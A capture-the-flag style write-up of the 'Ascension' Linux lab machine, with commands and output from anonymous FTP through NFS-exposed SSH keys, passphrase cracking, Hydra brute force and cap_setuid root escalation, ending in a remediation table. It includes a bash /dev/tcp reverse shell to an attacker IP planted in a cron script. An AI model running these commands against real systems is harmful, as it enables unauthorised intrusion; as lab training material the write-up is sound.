Ascension

A Linux machine with multiple misconfigured services chained together — from anonymous FTP to root via Python capability abuse.

Anonymous FTP → NFS Share → SSH Key Crack → Cron Abuse → MySQL Dump → cap_setuid → Root
OS Linux (Ubuntu)
Difficulty Easy
Services FTP, SSH, HTTP, NFS
Author Dilan Dodangodage

FTP (Port 21)

Anonymous login was permitted. A file pwlist.txt containing compromised passwords was available for download.

bash
ftp anonymous@ascension.hsm
230 Login successful.

ftp> get pwlist.txt
226 Transfer complete. 202 bytes received.
🔍 Finding

Anonymous FTP access enabled with a password list exposed — useful for brute-forcing other services.

SSH (Port 22)

Key-based authentication is enabled. Direct root login is denied.

bash
ssh root@ascension.hsm
root@ascension.hsm: Permission denied (publickey).

HTTP (Port 80)

Apache default page served. Directory enumeration with dirsearch revealed a WordPress installation with directory listing enabled.

NFS / Shares (Port 111)

showmount revealed a world-accessible NFS export. Mounting it exposed SSH keys for user1.

bash
showmount -e ascension.hsm
Export list for ascension.hsm:
/srv/nfs/user1 *

sudo mount -t nfs -o vers=3 ascension.hsm:/srv/nfs/user1 /mnt/ascension -o nolock

ls /mnt/ascension
id_rsa  id_rsa.pub
⚠️ Critical Finding

NFS share world-accessible with no IP restriction — exposing private SSH keys to any host on the network.

// 02 Initial Access

The SSH private key was passphrase-protected. The hash was extracted using ssh2john and cracked against rockyou.txt.

bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

sammie1          (id_rsa)
1g 0:00:06:47 DONE
✅ Credentials

SSH key passphrase cracked — sammie1

bash
ssh user1@ascension.hsm -i id_rsa
Enter passphrase: sammie1
user1@ip-10-1-96-99:~$

// 03 Post-Exploitation

The system had four users with shells. Each was compromised through a different technique.

passwd entries
user1:x:1001:1001::/home/user1:/bin/bash
user2:x:1002:1002::/home/user2:/bin/bash
user3:x:1003:1003::/home/user3:/bin/bash
ftpuser:x:1004:1004::/home/ftpuser:/bin/bash

Lateral Movement → user2 (Cron Job Abuse)

Process monitoring revealed a cron job running as user2 (UID=1002) executing /tmp/backup.sh. The file was world-writable and replaced with a reverse shell.

bash
# Payload written to /tmp/backup.sh
bash -c 'exec bash -i >/dev/tcp/10.200.17.76/1337 <&1'

# Listener on attacker
nc -lvnp 1337

user2@ip-10-1-96-99:~$ whoami
user2

Lateral Movement → ftpuser (Brute Force)

Used the pwlist.txt from FTP with Hydra to brute-force the ftpuser FTP account.

bash
hydra -l ftpuser -P pwlist.txt ftp://ascension.hsm

[21][ftp] host: ascension.hsm   login: ftpuser   password: secret
✅ Credentials

ftpuser : secret

// 04 Privilege Escalation

Checking Linux capabilities revealed a Python binary in user3's home directory with cap_setuid=ep — allowing it to set the process UID to 0 (root).

bash
getcap -r / 2>/dev/null

/home/user3/python3 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
bash — exploit
/home/user3/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# whoami
root
⚠️ Critical — cap_setuid Abuse

Python binary with cap_setuid capability allows any process spawned by it to run as root. Remove unnecessary capabilities with setcap -r /home/user3/python3

// 06 Lessons Learned

Each vulnerability in this machine was a result of a misconfiguration that could have been avoided with basic security hygiene.

FindingRiskRecommendation
Anonymous FTP with sensitive files High Disable anonymous FTP or restrict accessible files
NFS share world-accessible High Restrict NFS exports with IP allowlisting
Weak SSH key passphrase High Use strong, unique passphrases on all keys
World-writable cron script in /tmp Critical Restrict cron script permissions, avoid /tmp
Plaintext credentials in wp-config.php High Use environment variables or secrets management
Weak database credentials Medium Enforce strong password policy for DB users
Python binary with cap_setuid capability Critical Audit and remove unnecessary Linux capabilities
